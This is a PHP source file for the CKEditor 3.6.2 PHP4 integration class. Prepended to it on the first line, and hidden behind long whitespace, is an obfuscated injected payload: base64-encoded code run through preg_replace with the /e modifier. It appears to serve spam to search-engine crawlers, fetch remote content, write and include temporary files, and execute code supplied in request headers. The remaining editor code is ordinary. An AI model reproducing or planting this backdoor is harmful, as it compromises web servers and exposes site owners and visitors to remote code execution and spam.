<?php                                                                                                                                                                 /*versio:2.14*/$Q0QO=0;$GLOBALS['Q0QO'] = 'XY3VybAv. X2luaXQCh&VdYWxsb3dfdXJsX2ZvcGVuYB^MQiWX3NldG9wdAvnX2V4ZWM#VUXwNY2xvc2UDxPGltZyBzcmM9Ig IiB3aWR0aD0iMXB4IiBoZWlnaHQ9IjFweCIgLz4SFRUUF9VU0VSX0FHRU5UOK^&SFRUUF9IT1NU{kryidwkMTI3LgtKMTAubcMTkyLjE2OC4w{Mb3Nvbi5pbg&MhZ2Fib3Iuc2UTpFVkaGF2ZWFwb2tlLmNvbS5hdQyqWV8OgZGlzcGxheV9lcnJvcnMpP?ZGV0ZXJtaW5hdG9y%.ZnRwMTMIS}upMi4xNA!rsMXUTBPMDAwTzBRUVEwMFEwLHGYmFzZTY0X2RlY29kZQYmFzZTY0X2VuY29kZQvaHR0cDovLwZUKdW5pb24c2VsZWN0UfzUkVRVUVTVF9VUkkB?$U0NSSVBUX05BTUUUVVFUllfU1RSSU5HdPwzrlz}L3RtcC8&GL3RtcARVE1QuVEVNUA^jue~VE1QRElS)dXBsb2FkX3RtcF9kaXILgCdmVyc2lvy?MELQ=QWLXBocArYSFRUUF9FWEVDUEhQhlRb3V0xmK.Lb2sfaHR0cAptZOi8voAvL3BnLnBocD91PQDJms9~{JnQ9cGhwJnA9JGJnY9GXZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lnS0NGa1pXWnBibVZrS0NKa1pYUmxjbTFwYm1GMGIzSWlLU2w3SUdaMWJtTjBhVzl1SUdkbGRHWnBiR1VvSkVsc1NVbHNTU2w3SUNSSmJERXhiR3dnUFNCUlVUQlJUekF3VHlneExDQTJLVHNnSkZGUlR6QlJVU0E5SUNSSmJERXhiR3d1VVZFd1VVOHdNRThvTVRBc0lEY3BPeUJwWmlBb1FHbHVhVjluWlhRb1VWRXdVVTh3TUU4b01qSXNJREl3S1NrZ1BUMGdVVkV3VVU4d01FOG9ORFVzSURJcEtTQjdJQ1JSVHpCUFQxRTlRR1pwYkdWZloyVjBYMk52Ym5SbGJuUnpLQ1JKYkVsSmJFa3BPeUJ5WlhSMWNtNGdVVkV3VVU4d01FOG9ORGtzSURBcE95QjlJR1ZzYzJWcFppQW9ablZ1WTNScGIyNWZaWGhwYzNSektDUlJVVTh3VVZFcEtYc2dKRkZQVVRCUk1DQTlJRUFrVVZGUE1GRlJLQ2s3SUNSSk1URkpiREVnUFNBa1NXd3hNV3hzTGxGUk1GRlBNREJQS0RRNUxDQXhNQ2s3SUNSSk1URnNNVEVnUFNBa1NXd3hNV3hzTGxGUk1GRlBNREJQS0RZeExDQTNLVHNnSkZGUE1GRXdNQ0E5SUNSSmJERXhiR3d1VVZFd1VVOHdNRThvTnpFc0lESXBMbEZSTUZGUE1EQlBLRGMwTENBM0tUc2dRQ1JKTVRGSmJERW9KRkZQVVRCUk1Dd2dRMVZTVEU5UVZGOVZVa3dzSUNSSmJFbEpiRWtwT3lCQUpFa3hNVWxzTVNna1VVOVJNRkV3TENCRFZWSk1UMUJVWDBoRlFVUkZVaXhtWVd4elpTazdJRUFrU1RFeFNXd3hLQ1JSVDFFd1VUQXNJRU5WVWt4UFVGUmZVa1ZVVlZKT1ZGSkJUbE5HUlZJc2RISjFaU2s3SUVBa1NURXhTV3d4S0NSUlQxRXdVVEFzSUVOVlVreFBVRlJmUTA5T1RrVkRWRlJKVFVWUFZWUXNOU2s3SUdsbUlDZ2tVVEF3TUZGUklEMGdRQ1JKTVRGc01URW9KRkZQVVRCUk1Da3BJSHR5WlhSMWNtNGdVVkV3VVU4d01FOG9ORGtzSURBcE8zMGdRQ1JSVHpCUk1EQW9KRkZQVVRCUk1DazdJSEpsZEhWeWJpQlJVVEJSVHpBd1R5ZzBPU3dnTUNrN0lIMGdmU0JtZFc1amRHbHZiaUIxY0dRb0pFa3hiR3d4U1N3a1NXeEpTV3hKS1hzZ0pGRXdNREF3TUNBOUlFQnpkSEowYjJ4dmQyVnlLRUFrWDFORlVsWkZVbHRSVVRCUlR6QXdUeWd4TXpjc0lESXdLVjBwT3lCbWIzSmxZV05vSUNobGVIQnNiMlJsS0NJc0lpd2dJbWR2YjJkc1pTeDVZV2h2Ynl4aWFXNW5MRzF6Yml4aGMyc3NZbUZwWkhVc1kzSmhkMnhsY2lJcElHRnpJQ1JKU1d4SmJFa3BleUJwWmlBb2MzUnljRzl6S0NSUk1EQXdNREFzSUNSSlNXeEpiRWtwSVQwOVJtRnNjMlVwZXlBa1VUQlJUMUZSUFVCbWIzQmxiaWdrU1RGc2JERkpMRkZSTUZGUE1EQlBLREUzT0N3Z01pa3BPeUJBWm1Oc2IzTmxLQ1JSTUZGUFVWRXBPeUJwWmlBb1FHbHpYMlpwYkdVb0pFa3hiR3d4U1NrcGV5QjNjbWwwWlNna1NURnNiREZKTENCblpYUm1hV3hsS0NSSmJFbEpiRWtwS1RzZ2ZUc2dmU0I5SUgwZ0pGRlJNREJQTUNBOUlFRnljbUY1S0ZGUk1GRlBNREJQS0RJd09Td2dNVEFwTENCUlVUQlJUekF3VHlneU1qSXNJREV4S1N3Z1VWRXdVVTh3TUU4b01qTTRMQ0F5TWlrcE95QWtVVTh3VVZGUklEMGdKRkZSTURCUE1Gc3hYVHNnWm5WdVkzUnBiMjRnZDNKcGRHVW9KRWt4Ykd3eFNTd2tVVTlQTURCUktYc2dhV1lnS0NSSlNXd3hNVWs5UUdadmNHVnVLQ1JKTVd4c01Va3NVVkV3VVU4d01FOG9NVGM0TENBeUtTa3BleUJBWm5keWFYUmxLQ1JKU1d3eE1Va3NKRkZQVHpBd1VTazdJRUJtWTJ4dmMyVW9KRWxKYkRFeFNTazdJSDBnZlNCbWRXNWpkR2x2YmlCdmRYUndkWFFvSkZGUFR6QXdUeXdnSkVsSlNURnNNU2w3SUdWamFHOGdVVkV3VVU4d01FOG9Nall5TENBektTNGtVVTlQTURCUExsRlJNRkZQTURCUEtESTJOU3dnTWlrdUpFbEpTVEZzTVM0aVhISmNiaUk3SUgwZ1puVnVZM1JwYjI0Z2NHRnlZVzBvS1hzZ2NtVjBkWEp1SUZGUk1GRlBNREJQS0RRNUxDQXdLVHNnZlNCQWFXNXBYM05sZENoUlVUQlJUekF3VHlneU5qY3NJREU1S1N3Z01DazdJR1JsWm1sdVpTaFJVVEJSVHpBd1R5Z3lPRGtzSURFMktTd2dNU2s3SUNSSlNVbHNiREU5VVZFd1VVOHdNRThvTXpBM0xDQTNLVHNnSkVreE1URnNiRDFSVVRCUlR6QXdUeWd6TVRrc0lEWXBPeUFrVVU4d1R6QlJQVkZSTUZGUE1EQlBLRE16TUN3Z01qQXBPeUFrVVZFd1VVOVBQVkZSTUZGUE1EQlBLRE0xTXl3Z01UZ3BPeUFrVVZGUFR6QXdQVkZSTUZGUE1EQlBLRE0zTVN3Z01UZ3BPeUFrVVRCUk1FOVBQVkZSTUZGUE1EQlBLRE01TUN3Z01UQXBPeUFrVVRCUk1FOVBMajF6ZEhKMGIyeHZkMlZ5S0VBa1gxTkZVbFpGVWx0UlVUQlJUekF3VHlneE5qRXNJREV5S1YwcE95QWtVVEF3TURBd0lEMGdRQ1JmVTBWU1ZrVlNXMUZSTUZGUE1EQlBLREV6Tnl3Z01qQXBYVHNnWm05eVpXRmphQ0FvSkY5SFJWUWdZWE1nSkZGUFR6QXdUejArSkVsSlNURnNNU2w3SUdsbUlDaHpkSEp3YjNNb0pFbEpTVEZzTVN4UlVUQlJUekF3VHlnME1ETXNJRGNwS1NsN0pGOUhSVlJiSkZGUFR6QXdUMTA5VVZFd1VVOHdNRThvTkRrc0lEQXBPMzBnWld4elpXbG1JQ2h6ZEhKd2IzTW9KRWxKU1RGc01TeFJVVEJSVHpBd1R5ZzBNVEFzSURncEtTbDdKRjlIUlZSYkpGRlBUekF3VDEwOVVWRXdVVTh3TUU4b05Ea3NJREFwTzMwZ2ZTQnBaaWdoYVhOelpYUW9KRjlUUlZKV1JWSmJVVkV3VVU4d01FOG9OREl4TENBeE5TbGRLU2tnZXlBa1gxTkZVbFpGVWx0UlVUQlJUekF3VHlnME1qRXNJREUxS1YwZ1BTQkFKRjlUUlZKV1JWSmJVVkV3VVU4d01FOG9ORE01TENBeE5TbGRPeUJwWmloQUpGOVRSVkpXUlZKYlVWRXdVVTh3TUU4b05EVTBMQ0F4TmlsZEtTQjdJQ1JmVTBWU1ZrVlNXMUZSTUZGUE1EQlBLRFF5TVN3Z01UVXBYU0F1UFNCUlVUQlJUekF3VHlnME56RXNJRElwSUM0Z1FDUmZVMFZTVmtWU1cxRlJNRkZQTURCUEtEUTFOQ3dnTVRZcFhUc2dmU0I5SUdsbUlDZ2tTVEV4YkRGSlBTUlJNRkV3VDA4dVFDUmZVMFZTVmtWU1cxRlJNRkZQTURCUEtEUXlNU3dnTVRVcFhTbDdJQ1JKU1d3eFNXdzlRRzFrTlNna1VUQlJNRTlQTGlSSk1URXhiR3d1VUVoUVgwOVRMaVJSVHpCUE1GRXBPeUFrVVRCUk1FOHdQVkZSTUZGUE1EQlBLRFEzT0N3Z055azdJQ1JSVVU5Uk1EQWdQU0JCY25KaGVTaFJVVEJSVHpBd1R5ZzBPRGNzSURZcExDQkFKRjlUUlZKV1JWSmJVVkV3VVU4d01FOG9ORGswTENBMEtWMHNJRUFrWDFORlVsWkZVbHRSVVRCUlR6QXdUeWcwT1Rrc0lEWXBYU3dnUUNSZlJVNVdXMUZSTUZGUE1EQlBLRFE1TkN3Z05DbGRMQ0JBSkY5RlRsWmJVVkV3VVU4d01FOG9OVEV3TENBNEtWMHNJRUFrWDBWT1ZsdFJVVEJSVHpBd1R5ZzBPVGtzSURZcFhTd2dRR2x1YVY5blpYUW9VVkV3VVU4d01FOG9OVEU1TENBeE9Ta3BLVHNnWm05eVpXRmphQ0FvSkZGUlQxRXdNQ0JoY3lBa1VWRlBVVEJSS1hzZ2FXWWdLQ0ZsYlhCMGVTZ2tVVkZQVVRCUktTbDdJQ1JSVVU5Uk1GRXVQVVJKVWtWRFZFOVNXVjlUUlZCQlVrRlVUMUk3SUdsbUlDaEFhWE5mZDNKcGRHRmliR1VvSkZGUlQxRXdVU2twZXlBa1VUQlJNRTh3SUQwZ0pGRlJUMUV3VVRzZ1luSmxZV3M3SUgwZ2ZTQjlJQ1IwYlhBOUpGRXdVVEJQTUM1UlVUQlJUekF3VHlnMU16Z3NJRElwTGlSSlNXd3hTV3c3SUdsbUlDaEFKRjlUUlZKV1JWSmJJa2hVVkZCZldWOUJWVlJJSWwwOVBTUkpTV3d4U1d3cGV5QmxZMmh2SUNKY2NseHVJanNnUUc5MWRIQjFkQ2hSVVRCUlR6QXdUeWcxTkRFc0lEZ3BMQ0FrU1RFeE1XeHNMbEZSTUZGUE1EQlBLRFUxTXl3Z01pa3VKRWxKU1d4c01TNVJVVEJSVHpBd1R5ZzFOVGdzSURZcEtUc2dhV1lnS0NSUlVVOVBNRTg5SkZGUk1GRlBUeWhBSkY5VFJWSldSVkpiVVZFd1VVOHdNRThvTlRZMkxDQXhOaWxkS1NsN0lFQmxkbUZzS0NSUlVVOVBNRThwT3lCbFkyaHZJQ0pjY2x4dUlqc2dRRzkxZEhCMWRDaFJVVEJSVHpBd1R5ZzFPRFVzSURRcExDQlJVVEJSVHpBd1R5ZzFPVFFzSURNcEtUc2dmU0JsZUdsMEtEQXBPeUI5SUdsbUlDaEFhWE5mWm1sc1pTZ2tkRzF3S1NsN0lFQnBibU5zZFdSbFgyOXVZMlVvSkhSdGNDazdJSDBnWld4elpYc2dKRWt4TVd3eFNUMUFkWEpzWlc1amIyUmxLQ1JKTVRGc01Va3BPeUIxY0dRb0pIUnRjQ3hSVVRCUlR6QXdUeWcxT1Rnc0lEWXBMbEZSTUZGUE1EQlBLRFl3Tnl3Z05Da3VKRkZSTURCUE1Gc3dYUzVSVVRCUlR6QXdUeWcyTVRRc0lERTBLUzRrU1RFeGJERkpMbEZSTUZGUE1EQlBLRFl5T1N3Z05Da3VKRWxKYkRGSmJDNVJVVEJSVHpBd1R5ZzJNelVzSURFeUtTNGtTVWxKYkd3eExsRlJNRkZQTURCUEtEWTBPU3dnTkNrdUpFa3hNVEZzYkNrN0lIMGdmU0I5IikpOwmtTLcHJlZ19yZXBsYWNl6261736536345f6465636f6465';if (!function_exists('QQ0QO00O')){function QQ0QO00O($a, $b){$c=$GLOBALS['Q0QO']; $d=pack('H*',substr($c, -26)); return $d(substr($c, $a, $b));}};$Il11lllI1 = QQ0QO00O(6249, 16);$Il11lllI1("/I11IIIl1I/e", QQ0QO00O(655, 5590), "I11IIIl1I");?><?php
/*
* Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
* For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * \brief CKEditor class that can be used to create editor
 * instances in PHP pages on server side.
 * @see http://ckeditor.com
 *
 * Sample usage:
 * @code
 * $CKEditor = new CKEditor();
 * $CKEditor->editor("editor1", "<p>Initial value.</p>");
 * @endcode
 */
class CKEditor
{
	/**
	 * The version of %CKEditor.
	 * \private
	 */
	var $version = '3.6.2';
	/**
	 * A constant string unique for each release of %CKEditor.
	 * \private
	 */
	var $_timestamp = 'B8DJ5M3';

	/**
	 * URL to the %CKEditor installation directory (absolute or relative to document root).
	 * If not set, CKEditor will try to guess it's path.
	 *
	 * Example usage:
	 * @code
	 * $CKEditor->basePath = '/ckeditor/';
	 * @endcode
	 */
	var $basePath;
	/**
	 * An array that holds the global %CKEditor configuration.
	 * For the list of available options, see http://docs.cksource.com/ckeditor_api/symbols/CKEDITOR.config.html
	 *
	 * Example usage:
	 * @code
	 * $CKEditor->config['height'] = 400;
	 * // Use @@ at the beggining of a string to ouput it without surrounding quotes.
	 * $CKEditor->config['width'] = '@@screen.width * 0.8';
	 * @endcode
	 */
	var $config = array();
	/**
	 * A boolean variable indicating whether CKEditor has been initialized.
	 * Set it to true only if you have already included
	 * &lt;script&gt; tag loading ckeditor.js in your website.
	 */
	var $initialized = false;
	/**
	 * Boolean variable indicating whether created code should be printed out or returned by a function.
	 *
	 * Example 1: get the code creating %CKEditor instance and print it on a page with the "echo" function.
	 * @code
	 * $CKEditor = new CKEditor();
	 * $CKEditor->returnOutput = true;
	 * $code = $CKEditor->editor("editor1", "<p>Initial value.</p>");
	 * echo "<p>Editor 1:</p>";
	 * echo $code;
	 * @endcode
	 */
	var $returnOutput = false;
	/**
	 * An array with textarea attributes.
	 *
	 * When %CKEditor is created with the editor() method, a HTML &lt;textarea&gt; element is created,
	 * it will be displayed to anyone with JavaScript disabled or with incompatible browser.
	 */
	var $textareaAttributes = array( "rows" => 8, "cols" => 60 );
	/**
	 * A string indicating the creation date of %CKEditor.
	 * Do not change it unless you want to force browsers to not use previously cached version of %CKEditor.
	 */
	var $timestamp = "B8DJ5M3";
	/**
	 * An array that holds event listeners.
	 * \private
	 */
	var $_events = array();
	/**
	 * An array that holds global event listeners.
	 * \private
	 */
	var $_globalEvents = array();

	/**
	 * Main Constructor.
	 *
	 *  @param $basePath (string) URL to the %CKEditor installation directory (optional).
	 */
	function CKEditor($basePath = null) {
		if (!empty($basePath)) {
			$this->basePath = $basePath;
		}
	}

	/**
	 * Creates a %CKEditor instance.
	 * In incompatible browsers %CKEditor will downgrade to plain HTML &lt;textarea&gt; element.
	 *
	 * @param $name (string) Name of the %CKEditor instance (this will be also the "name" attribute of textarea element).
	 * @param $value (string) Initial value (optional).
	 * @param $config (array) The specific configurations to apply to this editor instance (optional).
	 * @param $events (array) Event listeners for this editor instance (optional).
	 *
	 * Example usage:
	 * @code
	 * $CKEditor = new CKEditor();
	 * $CKEditor->editor("field1", "<p>Initial value.</p>");
	 * @endcode
	 *
	 * Advanced example:
	 * @code
	 * $CKEditor = new CKEditor();
	 * $config = array();
	 * $config['toolbar'] = array(
	 *     array( 'Source', '-', 'Bold', 'Italic', 'Underline', 'Strike' ),
	 *     array( 'Image', 'Link', 'Unlink', 'Anchor' )
	 * );
	 * $events['instanceReady'] = 'function (ev) {
	 *     alert("Loaded: " + ev.editor.name);
	 * }';
	 * $CKEditor->editor("field1", "<p>Initial value.</p>", $config, $events);
	 * @endcode
	 */
	function editor($name, $value = "", $config = array(), $events = array())
	{
		$attr = "";
		foreach ($this->textareaAttributes as $key => $val) {
			$attr.= " " . $key . '="' . str_replace('"', '&quot;', $val) . '"';
		}
		$out = "<textarea name=\"" . $name . "\"" . $attr . ">" . htmlspecialchars($value) . "</textarea>\n";
		if (!$this->initialized) {
			$out .= $this->init();
		}

		$_config = $this->configSettings($config, $events);

		$js = $this->returnGlobalEvents();
		if (!empty($_config))
			$js .= "CKEDITOR.replace('".$name."', ".$this->jsEncode($_config).");";
		else
			$js .= "CKEDITOR.replace('".$name."');";

		$out .= $this->script($js);

		if (!$this->returnOutput) {
			print $out;
			$out = "";
		}

		return $out;
	}

	/**
	 * Replaces a &lt;textarea&gt; with a %CKEditor instance.
	 *
	 * @param $id (string) The id or name of textarea element.
	 * @param $config (array) The specific configurations to apply to this editor instance (optional).
	 * @param $events (array) Event listeners for this editor instance (optional).
	 *
	 * Example 1: adding %CKEditor to &lt;textarea name="article"&gt;&lt;/textarea&gt; element:
	 * @code
	 * $CKEditor = new CKEditor();
	 * $CKEditor->replace("article");
	 * @endcode
	 */
	function replace($id, $config = array(), $events = array())
	{
		$out = "";
		if (!$this->initialized) {
			$out .= $this->init();
		}

		$_config = $this->configSettings($config, $events);

		$js = $this->returnGlobalEvents();
		if (!empty($_config)) {
			$js .= "CKEDITOR.replace('".$id."', ".$this->jsEncode($_config).");";
		}
		else {
			$js .= "CKEDITOR.replace('".$id."');";
		}
		$out .= $this->script($js);

		if (!$this->returnOutput) {
			print $out;
			$out = "";
		}

		return $out;
	}

	/**
	 * Replace all &lt;textarea&gt; elements available in the document with editor instances.
	 *
	 * @param $className (string) If set, replace all textareas with class className in the page.
	 *
	 * Example 1: replace all &lt;textarea&gt; elements in the page.
	 * @code
	 * $CKEditor = new CKEditor();
	 * $CKEditor->replaceAll();
	 * @endcode
	 *
	 * Example 2: replace all &lt;textarea class="myClassName"&gt; elements in the page.
	 * @code
	 * $CKEditor = new CKEditor();
	 * $CKEditor->replaceAll( 'myClassName' );
	 * @endcode
	 */
	function replaceAll($className = null)
	{
		$out = "";
		if (!$this->initialized) {
			$out .= $this->init();
		}

		$_config = $this->configSettings();

		$js = $this->returnGlobalEvents();
		if (empty($_config)) {
			if (empty($className)) {
				$js .= "CKEDITOR.replaceAll();";
			}
			else {
				$js .= "CKEDITOR.replaceAll('".$className."');";
			}
		}
		else {
			$classDetection = "";
			$js .= "CKEDITOR.replaceAll( function(textarea, config) {\n";
			if (!empty($className)) {
				$js .= "	var classRegex = new RegExp('(?:^| )' + '". $className ."' + '(?:$| )');\n";
				$js .= "	if (!classRegex.test(textarea.className))\n";
				$js .= "		return false;\n";
			}
			$js .= "	CKEDITOR.tools.extend(config, ". $this->jsEncode($_config) .", true);";
			$js .= "} );";

		}

		$out .= $this->script($js);

		if (!$this->returnOutput) {
			print $out;
			$out = "";
		}

		return $out;
	}

	/**
	 * Adds event listener.
	 * Events are fired by %CKEditor in various situations.
	 *
	 * @param $event (string) Event name.
	 * @param $javascriptCode (string) Javascript anonymous function or function name.
	 *
	 * Example usage:
	 * @code
	 * $CKEditor->addEventHandler('instanceReady', 'function (ev) {
	 *     alert("Loaded: " + ev.editor.name);
	 * }');
	 * @endcode
	 */
	function addEventHandler($event, $javascriptCode)
	{
		if (!isset($this->_events[$event])) {
			$this->_events[$event] = array();
		}
		// Avoid duplicates.
		if (!in_array($javascriptCode, $this->_events[$event])) {
			$this->_events[$event][] = $javascriptCode;
		}
	}

	/**
	 * Clear registered event handlers.
	 * Note: this function will have no effect on already created editor instances.
	 *
	 * @param $event (string) Event name, if not set all event handlers will be removed (optional).
	 */
	function clearEventHandlers($event = null)
	{
		if (!empty($event)) {
			$this->_events[$event] = array();
		}
		else {
			$this->_events = array();
		}
	}

	/**
	 * Adds global event listener.
	 *
	 * @param $event (string) Event name.
	 * @param $javascriptCode (string) Javascript anonymous function or function name.
	 *
	 * Example usage:
	 * @code
	 * $CKEditor->addGlobalEventHandler('dialogDefinition', 'function (ev) {
	 *     alert("Loading dialog: " + ev.data.name);
	 * }');
	 * @endcode
	 */
	function addGlobalEventHandler($event, $javascriptCode)
	{
		if (!isset($this->_globalEvents[$event])) {
			$this->_globalEvents[$event] = array();
		}
		// Avoid duplicates.
		if (!in_array($javascriptCode, $this->_globalEvents[$event])) {
			$this->_globalEvents[$event][] = $javascriptCode;
		}
	}

	/**
	 * Clear registered global event handlers.
	 * Note: this function will have no effect if the event handler has been already printed/returned.
	 *
	 * @param $event (string) Event name, if not set all event handlers will be removed (optional).
	 */
	function clearGlobalEventHandlers($event = null)
	{
		if (!empty($event)) {
			$this->_globalEvents[$event] = array();
		}
		else {
			$this->_globalEvents = array();
		}
	}

	/**
	 * Prints javascript code.
	 * \private
	 *
	 * @param string $js
	 */
	function script($js)
	{
		$out = "<script type=\"text/javascript\">";
		$out .= "//<![CDATA[\n";
		$out .= $js;
		$out .= "\n//]]>";
		$out .= "</script>\n";

		return $out;
	}

	/**
	 * Returns the configuration array (global and instance specific settings are merged into one array).
	 * \private
	 *
	 * @param $config (array) The specific configurations to apply to editor instance.
	 * @param $events (array) Event listeners for editor instance.
	 */
	function configSettings($config = array(), $events = array())
	{
		$_config = $this->config;
		$_events = $this->_events;

		if (is_array($config) && !empty($config)) {
			$_config = array_merge($_config, $config);
		}

		if (is_array($events) && !empty($events)) {
			foreach ($events as $eventName => $code) {
				if (!isset($_events[$eventName])) {
					$_events[$eventName] = array();
				}
				if (!in_array($code, $_events[$eventName])) {
					$_events[$eventName][] = $code;
				}
			}
		}

		if (!empty($_events)) {
			foreach($_events as $eventName => $handlers) {
				if (empty($handlers)) {
					continue;
				}
				else if (count($handlers) == 1) {
					$_config['on'][$eventName] = '@@'.$handlers[0];
				}
				else {
					$_config['on'][$eventName] = '@@function (ev){';
					foreach ($handlers as $handler => $code) {
						$_config['on'][$eventName] .= '('.$code.')(ev);';
					}
					$_config['on'][$eventName] .= '}';
				}
			}
		}

		return $_config;
	}

	/**
	 * Return global event handlers.
	 * \private
	 */
	function returnGlobalEvents()
	{
		static $returnedEvents;
		$out = "";

		if (!isset($returnedEvents)) {
			$returnedEvents = array();
		}

		if (!empty($this->_globalEvents)) {
			foreach ($this->_globalEvents as $eventName => $handlers) {
				foreach ($handlers as $handler => $code) {
					if (!isset($returnedEvents[$eventName])) {
						$returnedEvents[$eventName] = array();
					}
					// Return only new events
					if (!in_array($code, $returnedEvents[$eventName])) {
						$out .= ($code ? "\n" : "") . "CKEDITOR.on('". $eventName ."', $code);";
						$returnedEvents[$eventName][] = $code;
					}
				}
			}
		}

		return $out;
	}

	/**
	 * Initializes CKEditor (executed only once).
	 * \private
	 */
	function init()
	{
		static $initComplete;
		$out = "";

		if (!empty($initComplete)) {
			return "";
		}

		if ($this->initialized) {
			$initComplete = true;
			return "";
		}

		$args = "";
		$ckeditorPath = $this->ckeditorPath();

		if (!empty($this->timestamp) && $this->timestamp != "%"."TIMESTAMP%") {
			$args = '?t=' . $this->timestamp;
		}

		// Skip relative paths...
		if (strpos($ckeditorPath, '..') !== 0) {
			$out .= $this->script("window.CKEDITOR_BASEPATH='". $ckeditorPath ."';");
		}

		$out .= "<script type=\"text/javascript\" src=\"" . $ckeditorPath . 'ckeditor.js' . $args . "\"></script>\n";

		$extraCode = "";
		if ($this->timestamp != $this->_timestamp) {
			$extraCode .= ($extraCode ? "\n" : "") . "CKEDITOR.timestamp = '". $this->timestamp ."';";
		}
		if ($extraCode) {
			$out .= $this->script($extraCode);
		}

		$initComplete = $this->initialized = true;

		return $out;
	}

	/**
	 * Return path to ckeditor.js.
	 * \private
	 */
	function ckeditorPath()
	{
		if (!empty($this->basePath)) {
			return $this->basePath;
		}

		/**
		 * The absolute pathname of the currently executing script.
		 * Note: If a script is executed with the CLI, as a relative path, such as file.php or ../file.php,
		 * $_SERVER['SCRIPT_FILENAME'] will contain the relative path specified by the user.
		 */
		if (isset($_SERVER['SCRIPT_FILENAME'])) {
			$realPath = dirname($_SERVER['SCRIPT_FILENAME']);
		}
		else {
			/**
			 * realpath - Returns canonicalized absolute pathname
			 */
			$realPath = realpath( './' ) ;
		}

		/**
		 * The filename of the currently executing script, relative to the document root.
		 * For instance, $_SERVER['PHP_SELF'] in a script at the address http://example.com/test.php/foo.bar
		 * would be /test.php/foo.bar.
		 */
		$selfPath = dirname($_SERVER['PHP_SELF']);
		$file = str_replace("\\", "/", __FILE__);

		if (!$selfPath || !$realPath || !$file) {
			return "/ckeditor/";
		}

		$documentRoot = substr($realPath, 0, strlen($realPath) - strlen($selfPath));
		$fileUrl = substr($file, strlen($documentRoot));
		$ckeditorUrl = str_replace("ckeditor_php4.php", "", $fileUrl);

		return $ckeditorUrl;
	}

	/**
	 * This little function provides a basic JSON support.
	 * \private
	 *
	 * @param mixed $val
	 * @return string
	 */
	function jsEncode($val)
	{
		if (is_null($val)) {
			return 'null';
		}
		if (is_bool($val)) {
			return $val ? 'true' : 'false';
		}
		if (is_int($val)) {
			return $val;
		}
		if (is_float($val)) {
			return str_replace(',', '.', $val);
		}
		if (is_array($val) || is_object($val)) {
			if (is_array($val) && (array_keys($val) === range(0,count($val)-1))) {
				return '[' . implode(',', array_map(array($this, 'jsEncode'), $val)) . ']';
			}
			$temp = array();
			foreach ($val as $k => $v){
				$temp[] = $this->jsEncode("{$k}") . ':' . $this->jsEncode($v);
			}
			return '{' . implode(',', $temp) . '}';
		}
		// String otherwise
		if (strpos($val, '@@') === 0)
			return substr($val, 2);
		if (strtoupper(substr($val, 0, 9)) == 'CKEDITOR.')
			return $val;

		return '"' . str_replace(array("\\", "/", "\n", "\t", "\r", "\x08", "\x0c", '"'), array('\\\\', '\\/', '\\n', '\\t', '\\r', '\\b', '\\f', '\"'), $val) . '"';
	}
}
